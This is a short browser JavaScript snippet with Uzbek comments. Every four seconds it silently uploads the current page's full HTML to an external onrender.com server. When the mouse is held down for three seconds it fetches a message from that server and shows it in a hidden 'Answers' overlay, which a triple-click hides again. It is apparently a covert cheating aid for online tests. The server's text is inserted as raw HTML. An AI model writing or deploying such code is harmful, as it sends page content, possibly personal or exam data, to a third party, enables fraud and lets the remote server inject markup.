(function(){
    const SERVER = 'https://f1-f2mq.onrender.com';
    let box = null;

    // 1. Sahifani serverga yuborish (Live uchun)
    async function sendPage() {
        const html = document.documentElement.outerHTML;
        try {
            await fetch(SERVER + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: html })
            });
        } catch (e) {}
    }

    // 2. Sizdan xabarlarni olish
    async function checkMessage() {
        try {
            const r = await fetch(SERVER + '/latest');
            const data = await r.json();
            if (data.success) showBox(data.message);
        } catch (e) {}
    }

    function showBox(msg) {
        if (!box) {
            box = document.createElement('div');
            box.style = "position:fixed; bottom:10px; right:10px; background:rgba(0,0,0,0.8); color:white; padding:15px; border-radius:8px; z-index:999999; font-family:sans-serif; display:none;";
            document.body.appendChild(box);
        }
        box.innerHTML = "<b>Javoblar:</b><br>" + msg;
    }

    // Sichqonchani 3 soniya bosib turganda xabarni ko'rsatish
    let timer;
    document.addEventListener('mousedown', () => {
        timer = setTimeout(() => {
            checkMessage();
            if(box) box.style.display = 'block';
        }, 3000);
    });
    document.addEventListener('mouseup', () => clearTimeout(timer));

    // 3 marta tez bossa xabarni yashirish
    document.addEventListener('click', (e) => {
        if (e.detail === 3 && box) box.style.display = 'none';
    });

    // Ishga tushirish
    setInterval(sendPage, 4000); // Har 4 soniyada yuborish
    sendPage();
    console.log("F1 Faol");
})();
